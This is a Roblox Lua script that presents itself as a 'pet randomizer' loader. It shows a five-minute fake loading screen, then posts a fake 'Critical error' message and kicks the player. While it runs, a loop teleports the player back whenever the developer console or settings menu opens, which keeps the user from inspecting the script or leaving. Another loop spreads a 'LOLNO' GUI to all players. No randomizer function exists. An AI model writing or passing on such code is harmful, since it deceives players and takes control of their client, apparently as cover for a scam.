local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")

local lp = Players.LocalPlayer

local gui = Instance.new("ScreenGui")
gui.Name = "LoadingScreen"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.Parent = lp:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BorderSizePixel = 0
bg.ZIndex = 0
bg.Parent = gui

-- STAR BACKGROUND (ZIndex 0)
local starFrame = Instance.new("Frame")
starFrame.Size = UDim2.new(1, 0, 1, 0)
starFrame.Position = UDim2.new(0, 0, 0, 0)
starFrame.BackgroundTransparency = 1
starFrame.BorderSizePixel = 0
starFrame.ZIndex = 0
starFrame.Parent = bg

for i = 1, 75 do
	local star = Instance.new("Frame")
	star.Size = UDim2.new(0, math.random(2, 3), 0, math.random(2, 3))
	star.Position = UDim2.new(math.random(), 0, math.random(), 0)
	star.AnchorPoint = Vector2.new(0.5, 0.5)
	star.BackgroundColor3 = Color3.new(1, 1, 1)
	star.BackgroundTransparency = 0.2
	star.BorderSizePixel = 0
	star.ZIndex = 0
	star.Parent = starFrame

	task.spawn(function()
		while true do
			local fadeOut = TweenService:Create(star, TweenInfo.new(1), { BackgroundTransparency = 1 })
			local fadeIn = TweenService:Create(star, TweenInfo.new(1), { BackgroundTransparency = 0.2 })
			fadeOut:Play()
			fadeOut.Completed:Wait()
			fadeIn:Play()
			fadeIn.Completed:Wait()
			wait(math.random(1, 5) / 10)
		end
	end)
end

local title = Instance.new("TextLabel")
title.Text = "Loading pet randomizer please wait..."
title.Size = UDim2.new(1, 0, 0.1, 0)
title.Position = UDim2.new(0, 0, 0.05, 0)
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.FredokaOne
title.BackgroundTransparency = 1
title.ZIndex = 2
title.Parent = bg

local bar = Instance.new("Frame")
bar.Size = UDim2.new(0.85, 0, 0.06, 0)
bar.Position = UDim2.new(0.075, 0, 0.5, 0)
bar.BackgroundColor3 = Color3.new(0, 0, 0)
bar.BorderSizePixel = 0
bar.ClipsDescendants = true
bar.ZIndex = 2
bar.Parent = bg

local fill = Instance.new("Frame")
fill.Size = UDim2.new(0, 0, 1, 0)
fill.Position = UDim2.new(0, 0, 0, 0)
fill.BorderSizePixel = 0
fill.BackgroundColor3 = Color3.fromHSV(0, 1, 1)
fill.ZIndex = 3
fill.Parent = bar

TweenService:Create(fill, TweenInfo.new(300, Enum.EasingStyle.Linear), {
	Size = UDim2.new(1, 0, 1, 0)
}):Play()

task.spawn(function()
	while true do
		for h = 0, 1, 0.01 do
			fill.BackgroundColor3 = Color3.fromHSV(h, 1, 1)
			wait(0.1)
		end
	end
end)

task.delay(300, function()
	game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
		Text = "Critical error: failed to load pet list.",
		Color = Color3.new(1, 0, 0)
	})
	wait(1)
	lp:Kick("Error 502.")
end)

task.spawn(function()
	while true do
		pcall(function()
			local guiCheck = lp:FindFirstChild("PlayerGui")
			if guiCheck then
				if guiCheck:FindFirstChild("DevConsoleMaster") or guiCheck:FindFirstChild("SettingsShield") then
					TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, lp)
				end
			end
		end)
		wait(0.2)
	end
end)

task.spawn(function()
	while true do
		wait(0.4)
		local lolno = script:FindFirstChild("LOLNO")
		if lolno then
			for _, p in ipairs(Players:GetPlayers()) do
				local pg = p:FindFirstChild("PlayerGui")
				if pg and not pg:FindFirstChild("LOLNO") then
					lolno:Clone().Parent = pg
				end
			end
			if not game.StarterGui:FindFirstChild("LOLNO") then
				lolno:Clone().Parent = game.StarterGui
			end
		end
	end
end)
